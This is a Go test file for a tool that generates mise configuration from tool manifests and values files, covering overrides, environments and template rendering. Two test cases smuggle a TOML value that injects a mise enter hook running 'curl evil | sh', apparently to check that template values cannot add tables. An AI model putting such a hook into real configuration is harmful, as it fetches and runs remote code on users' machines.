package misegen

import (
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"github.com/virajp/bootstrap/sync-engine/internal/source"
)

// TestRepoExamples: each example values file of repo/examples, with the real
// tools of repo/tools.
func TestRepoExamples(t *testing.T) {
	root := treeRoot(t)
	files, _ := filepath.Glob(filepath.Join(root, "repo", "examples", "*", "bootstrap.toml"))
	more, _ := filepath.Glob(filepath.Join(root, "repo", "examples", "*", "*", "bootstrap.toml"))
	files = append(files, more...)
	sort.Strings(files)
	if len(files) != 11 {
		t.Fatalf("found %d example values files, want 11", len(files))
	}
	var cases []mcase
	for _, f := range files {
		rel, _ := filepath.Rel(filepath.Join(root, "repo", "examples"), f)
		b, err := os.ReadFile(f)
		if err != nil {
			t.Fatal(err)
		}
		name := "example-" + strings.ReplaceAll(strings.TrimSuffix(rel, "/bootstrap.toml"), "/", "-")
		cases = append(cases, mcase{name: name, side: source.Repo, mode: "full", values: string(b), real: true})
	}
	run(t, cases)
}

// TestMacosExample: macos/examples/macos.toml with the real tools of
// macos/tools, each tool and zz-macos.
func TestMacosExample(t *testing.T) {
	b, err := os.ReadFile(filepath.Join(treeRoot(t), "macos", "examples", "macos.toml"))
	if err != nil {
		t.Fatal(err)
	}
	more := "\n[overrides.mise.tools.\"npm:codeburn\"]\nversion = \"1.0.0\"\n[overrides.mise.shell_alias]\naistats = \"x\"\n" +
		"[mise.shell_alias]\nll = \"ls -l\"\n[mise.env]\nN = \"<% len .all %>\"\nC = '<% .all.codeburn | data.ToJSON %>'\n"
	run(t, []mcase{
		{name: "example-macos", side: source.Macos, mode: "full", values: string(b), real: true},
		{name: "example-macos-own-overrides", side: source.Macos, mode: "full", values: string(b) + more, real: true},
		{name: "example-macos-no-values", side: source.Macos, mode: "full", noValue: true, real: true},
	})
}

// repoTool gives the files of a repo tool <name> of the clone with the lines
// of a tools.toml (after the four keys that each repo tools.toml needs).
func repoTool(name string, lines ...string) map[string]string {
	head := []string{`default_envs = [ "dev" ]`, `depends = []`, `extensions = []`, `root_only = false`}
	return map[string]string{
		"clone/repo/tools/" + name + "/tools.toml": strings.Join(append(head, lines...), "\n") + "\n",
	}
}

func join(maps ...map[string]string) map[string]string {
	out := map[string]string{}
	for _, m := range maps {
		for k, v := range m {
			out[k] = v
		}
	}
	return out
}

// sed changes the lines of a file of the case that match <old> exactly.
func sed(path, old, repl string) func(t *testing.T, dir string) {
	return func(t *testing.T, dir string) {
		p := filepath.Join(dir, path)
		b, err := os.ReadFile(p)
		if err != nil {
			t.Fatal(err)
		}
		lines := strings.Split(string(b), "\n")
		for i, l := range lines {
			if l == old {
				lines[i] = repl
			}
		}
		writeFile(t, p, strings.Join(lines, "\n"))
	}
}

const (
	devOnly  = "environments = [ \"dev\" ]\n"
	devCI    = "environments = [ \"dev\", \"ci\" ]\n"
	mtestDev = devOnly + "[tools.mtest]\n"
)

// TestRepoCases: the mise cases of test:repo-sync, and more edge cases, with
// the real tools of repo/tools and a test tool mtest.
func TestRepoCases(t *testing.T) {
	render := repoTool("mtest", `[defaults]`, `x = "a"`, `[mise.env]`, `X = "<% .config.x %>"`)
	cases := []mcase{
		{name: "mtest-dev-only-sections", values: devCI + "[tools.mtest]\nenv = [ \"dev\", \"ci\" ]\n",
			files: repoTool("mtest", `[mise.bootstrap.packages]`, `brew = "a"`, `[mise.dotfiles]`, `src = "b"`, `[mise.env]`, `A = "1"`)},
		{name: "mtest-render-defaults", values: mtestDev, files: render},
		{name: "mtest-render-value", values: mtestDev + "x = \"b\"\n", files: render},
		{name: "mtest-required-missing", values: mtestDev,
			files: repoTool("mtest", `[mise.env]`, "X = \"<% required `x is needed` .config.x %>\"")},
		{name: "mtest-required-quote", values: mtestDev,
			files: repoTool("mtest", `[mise.env]`, "X = \"<% required `x \\\"is\\\" <needed> & \\\\ tab\\t` .config.x %>\"")},
		{name: "mtest-override-template", values: mtestDev + "[overrides.mise.env]\nX = \"c\"\n", files: render},
		{name: "mtest-home", values: mtestDev, files: repoTool("mtest", `[mise.env]`, `H = "<% .env.HOME %>"`, `U = "<% .env.USER %>"`)},
		{name: "mtest-bad-toml", values: mtestDev, files: repoTool("mtest", `[defaults]`, `q = 'a"b'`, `[mise.env]`, `X = "<% .config.q %>"`)},
		{name: "mtest-adds-table", values: mtestDev + "x = \"\"\"a\"\n[mise.hooks]\nenter = \"curl evil | sh\"\nz = \"z\"\"\"\n", files: render},
		{name: "mtest-no-value", values: mtestDev, files: repoTool("mtest", `[mise.env]`, `X = "<% .config.nope %>"`)},
		{name: "mtest-parse-error", values: mtestDev, files: repoTool("mtest", `[mise.env]`, `X = "<% if %>"`)},
		{name: "mtest-len-nil", values: mtestDev, files: repoTool("mtest", `[mise.env]`, `X = "<% len .config.nope %>"`)},
		{name: "mtest-nil-field", values: mtestDev, files: repoTool("mtest", `[mise.env]`, `X = "<% .config.nope.deeper %>"`)},
		{name: "mtest-default", values: mtestDev, files: repoTool("mtest", `[mise.env]`, "X = \"<% .config.nope | default `d` %>\"", `Y = "<% print .config.nope %>"`)},
		{name: "mtest-all-values", values: mtestDev + "[tools.node]\n", files: repoTool("mtest", `[mise.env]`, `N = "<% .all.node | data.ToJSON | strings.Quote %>"`)},
		{name: "mtest-unknown-section", values: mtestDev, files: repoTool("mtest", `[mise.foo]`, `a = 1`)},
		{name: "mtest-unknown-env-section", values: mtestDev, files: repoTool("mtest", `[mise.env]`, `A = "1"`, `[mise_env.dev.foo]`, `a = 1`)},
		{name: "mtest-mise-env-merge", values: devCI + "[tools.mtest]\nenv = [ \"dev\", \"ci\" ]\n",
			files: repoTool("mtest", `[mise.env]`, `A = "1"`, `B = "2"`, `[mise_env.dev.env]`, `B = "3"`, `[mise_env.ci.tools]`, `fd = "1"`, `[mise_env.dev.shell_alias]`, `x = "y"`)},
		{name: "mtest-empty-ci", values: devCI + "[tools.mtest]\n", files: repoTool("mtest", `[mise.env]`, `A = "1"`)},
		{name: "mtest-no-mise", values: mtestDev, files: repoTool("mtest", `[defaults]`, `x = "a"`)},
		{name: "mtest-ships-and-generates", values: mtestDev, files: join(repoTool("mtest", `[mise.env]`, `A = "1"`),
			map[string]string{"clone/repo/tools/mtest/.config/mise/conf.d/mtest/mise.dev.toml": "x\n"})},
		{name: "mtest-ships-ci-and-generates", values: devCI + "[tools.mtest]\nenv = [ \"dev\", \"ci\" ]\n", files: join(repoTool("mtest", `[mise.env]`, `A = "1"`),
			map[string]string{"clone/repo/tools/mtest/.config/mise/conf.d/mtest/mise.ci.toml": "x\n"})},
		{name: "mtest-ships-unselected-env", values: mtestDev, files: join(repoTool("mtest", `[mise.env]`, `A = "1"`),
			map[string]string{"clone/repo/tools/mtest/.config/mise/conf.d/mtest/mise.ci.toml": "x\n"})},
		{name: "mtest-marks", values: mtestDev + "[overrides.mise.tools]\nfd = \"2\"\n[overrides.mise.tools.\"npm:x\"]\nversion = \"3\"\n[overrides.mise.settings.node]\ncompile = true\n[overrides.mise.env]\n\"A B\" = \"z\"\n",
			files: repoTool("mtest", `[mise.tools]`, `fd = "1"`, `"npm:x" = { version = "1", depends = ["fd"] }`, `[mise.settings]`, `node.compile = false`, `[mise.env]`, `"A B" = "a"`, `C = "c = d"`)},
		{name: "mtest-envs-bad-name", values: mtestDev, files: repoTool("mtest", `[mise.tools.fd]`, `version = "1"`, `envs = [ "prod" ]`)},
		{name: "mtest-envs-empty-quirk", values: mtestDev, files: repoTool("mtest", `[mise.tools.fd]`, `version = "1"`, `envs = []`)},
		{name: "mtest-default-envs-ci", values: devCI + "[tools.mtest]\n", files: join(repoTool("mtest", `[mise.tools.fd]`, `version = "1"`)),
			setup: sed("clone/repo/tools/mtest/tools.toml", `default_envs = [ "dev" ]`, `default_envs = [ "dev", "ci" ]`)},
		{name: "mtest-requires-found", values: mtestDev, files: join(repoTool("mtest", `[mise.tools.fd]`, `version = "1"`, `requires_found = [ "a.txt", "b.txt" ]`, `[mise.tools.rg]`, `version = "2"`, `requires_found = [ "a.txt" ]`),
			map[string]string{"root/x/a.txt": ""})},
		{name: "dev-aliases", values: devOnly, aliases: "setup-all=mise run setup --all\nsetup-web=mise run setup --web"},
		{name: "override-java-version", values: devOnly + "[tools.java]\n[overrides.mise.tools.java]\nversion = \"21\"\n"},
		{name: "override-mise-env-ci-wins", values: devCI + "[tools.java]\n[overrides.mise.tools.java]\nversion = \"21\"\n[overrides.mise_env.ci.tools.java]\nversion = \"17\"\n"},
		{name: "override-unknown-mise-tool", values: devOnly + "[tools.java]\n[overrides.mise.tools.jav]\nversion = \"21\"\n"},
		{name: "override-without-tool", values: devOnly + "[overrides.mise.tools.java]\nversion = \"21\"\n"},
		{name: "override-env-key-no-tool", values: devOnly + "[tools.python]\n[overrides.mise.env]\nNEW_VAR = \"1\"\n"},
		{name: "override-envs-lock", values: devOnly + "[tools.java]\n[overrides.mise.tools.java]\nenvs = [ \"dev\" ]\n"},
		{name: "override-mise-env-ci-not-selected", values: devOnly + "[tools.java]\n[overrides.mise_env.ci.tools.java]\nversion = \"21\"\n"},
		{name: "override-mise-env-prod", values: devOnly + "[overrides.mise_env.prod.tools.java]\nversion = \"21\"\n"},
		{name: "override-not-tables", values: devOnly + "[overrides]\nmise = 1\nmise_env = { dev = 2 }\n"},
		{name: "override-not-table", values: devOnly + "overrides = 1\n"},
		{name: "override-ruff-requires", values: devOnly + "[tools.python]\n[overrides.mise.tools.ruff]\nrequires = \"setup.py\"\n"},
		{name: "override-ruff-requires-found", values: devOnly + "[tools.python]\n[overrides.mise.tools.ruff]\nrequires_found = [ \"setup.py\" ]\n"},
		{name: "override-ruff-files", values: devOnly + "[tools.python]\n[overrides.mise.tools.ruff]\nfiles = []\n"},
		{name: "override-many-problems", values: devOnly + "[tools.java]\n[overrides.mise.tools.java]\nenvs = [ \"dev\" ]\nnope = 1\n[overrides.mise_env.ci.tools.java]\nversion = \"1\"\n[overrides.mise_env.prod]\nx = 1\n"},
		{name: "override-linter-npm", values: devCI + "[overrides.mise.tools.\"npm:@virajp.dev/linter\"]\nversion = \"1.2.3\"\n[overrides.mise_env.ci.settings]\nos = \"windows\"\n"},
		{name: "check-mise-env-prod", local: true, values: devOnly + "[overrides.mise_env.prod.tools.java]\nversion = \"21\"\n"},
		{name: "check-mise-env-ci", local: true, values: devOnly + "[overrides.mise_env.ci.tools.java]\nversion = \"21\"\n"},
		{name: "check-envs-lock", local: true, values: devOnly + "[overrides.mise.tools.java]\nenvs = [ \"dev\" ]\n"},
		{name: "check-unknown-path", local: true, values: devOnly + "[overrides.mise.tools.nope]\nversion = \"21\"\n"},
		{name: "env-ci-pulumi-dev-only", values: devCI + "[tools.pulumi]\nenv = [ \"dev\", \"ci\" ]\n"},
		{name: "env-ci-pack-pulumi", values: devCI + "[packs.p]\nenv = [ \"dev\", \"ci\" ]\n",
			files: map[string]string{}, setup: addPack("p", "pulumi")},
		{name: "dependency-pulumi-ci", values: devCI + "[tools.node]\nenv = [ \"dev\", \"ci\" ]\n",
			setup: sed("clone/repo/tools/node/tools.toml", `depends = []`, `depends = [ "pulumi" ]`)},
		{name: "requires-found-root", values: devOnly + "[tools.python]\n", files: map[string]string{"root/pyproject.toml": ""}},
		{name: "requires-found-depth4", values: devOnly + "[tools.python]\n", files: map[string]string{"root/a/b/c/d/pyproject.toml": ""}},
		{name: "requires-found-depth5", values: devOnly + "[tools.python]\n", files: map[string]string{"root/a/b/c/d/e/pyproject.toml": ""}},
		{name: "kotlin-dev-ci", values: devCI + "[tools.kotlin]\nenv = [ \"dev\", \"ci\" ]\n"},
		{name: "swift-dev-ci", values: devCI + "[tools.swift]\nenv = [ \"dev\", \"ci\" ]\n"},
		{name: "all-tools-dev-ci", values: devCI, setup: allTools},
	}
	for i := range cases {
		cases[i].side, cases[i].mode, cases[i].real = source.Repo, "full", true
		cases[i].name = "repo-" + cases[i].name
	}
	run(t, cases)
}

// addPack adds a pack <name> with the tools <tools> to packs.toml of the clone.
func addPack(name string, tools ...string) func(t *testing.T, dir string) {
	return func(t *testing.T, dir string) {
		p := filepath.Join(dir, "clone", "repo", "packs.toml")
		b, err := os.ReadFile(p)
		if err != nil {
			t.Fatal(err)
		}
		s := string(b) + "\n[pack." + name + "]\n"
		for _, tool := range tools {
			s += tool + " = { default = true }\n"
		}
		writeFile(t, p, s)
	}
}

// allTools selects each tool of the clone in dev and ci, where its mise tools
// allow ci.
func allTools(t *testing.T, dir string) {
	src := source.Source{Root: filepath.Join(dir, "clone"), Side: source.Repo}
	names, err := src.ToolFolders()
	if err != nil {
		t.Fatal(err)
	}
	vals := devCI
	for _, n := range names {
		env := `[ "dev", "ci" ]`
		m, err := src.LoadManifest(n)
		if err != nil {
			t.Fatal(err)
		}
		for _, mt := range m.Mise {
			ci := false
			for _, e := range mt.Envs {
				ci = ci || e == "ci"
			}
			if !ci {
				env = `[ "dev" ]`
			}
		}
		if m.RootOnly {
			continue
		}
		vals += "[tools." + n + "]\nenv = " + env + "\n"
	}
	writeFile(t, filepath.Join(dir, "root", ".config", "bootstrap.toml"), vals)
}

// macosTool gives the tools.toml of a Mac tool of the clone.
func macosTool(name string, lines ...string) map[string]string {
	return map[string]string{"clone/macos/tools/" + name + "/tools.toml": strings.Join(lines, "\n") + "\n"}
}

// TestMacosCases: the cases of the side macos of test:repo-sync (a direct call
// of the library), and more edge cases.
func TestMacosCases(t *testing.T) {
	allSections := macosTool("mtest", `[defaults]`, `x = "a"`, `[mise.tools]`, `fd = "latest"`, `[mise.env]`, `X = "<% .config.x %>"`,
		`[mise.shell_alias]`, `ll = "ls -l"`, `[mise.bootstrap.packages]`, `brew = "a"`)
	envX := macosTool("mtest", `[mise.env]`, `X = "a"`)
	good := macosTool("good", `[mise.env]`, `A = "1"`)
	cases := []mcase{
		{name: "all-sections", mode: "direct", tools: "mtest", files: allSections},
		{name: "mise-env-in-one-of-two", mode: "direct", tools: "bad good",
			files: join(macosTool("bad", `[mise.env]`, `A = "1"`, `[mise_env.dev.env]`, `B = "2"`), good)},
		{name: "envs-key", mode: "direct", tools: "mtest", files: macosTool("mtest", `[mise.tools.fd]`, `version = "latest"`, `envs = [ "dev" ]`)},
		{name: "requires-found-key", mode: "direct", tools: "mtest", files: macosTool("mtest", `[mise.tools.fd]`, `version = "latest"`, `requires_found = [ "x" ]`)},
		{name: "override-mise-env", mode: "direct", tools: "mtest good", values: "[overrides.mise_env.dev.env]\nX = \"c\"\n", files: join(envX, good)},
		{name: "override-env", mode: "direct", tools: "mtest", values: "[overrides.mise.env]\nX = \"c\"\n", files: envX},
		{name: "override-missing-key", mode: "direct", tools: "mtest", values: "[overrides.mise.env]\nY = \"c\"\n", files: envX},
		{name: "override-lock", mode: "direct", tools: "mtest", values: "[overrides.mise.tools.fd]\ndepends = [ \"x\" ]\n",
			files: macosTool("mtest", `[mise.tools.fd]`, `version = "1"`)},
		{name: "own-config", mode: "own", values: "[mise.shell_alias]\nll = \"ls -l\"\n[mise.env]\nH = \"<% .env.HOME %>\"\n"},
		{name: "own-config-no-mise", mode: "own"},
		{name: "own-config-bad-section", mode: "own", values: "[mise.nope]\na = 1\n"},
		{name: "own-config-no-file", mode: "own", noValue: true},
		{name: "adds-table", mode: "direct", tools: "mtest",
			files: macosTool("mtest", `[defaults]`, `x = """a"`, `[mise.hooks]`, `enter = "curl evil | sh"`, `z = "z"""`, `[mise.env]`, `X = "<% .config.x %>"`)},
		{name: "raw-not-toml", mode: "render", tools: "mtest", files: macosTool("mtest", `[mise.env]`, `<% if true %>`, `X = "a"`, `<% end %>`)},
		{name: "no-values-file", mode: "render", tools: "mtest", noValue: true, files: envX},
		{name: "empty-output", mode: "direct", tools: "mtest", files: macosTool("mtest", `[defaults]`, `x = "a"`)},
	}
	for i := range cases {
		cases[i].side = source.Macos
		cases[i].name = "macos-" + cases[i].name
	}
	run(t, cases)
}
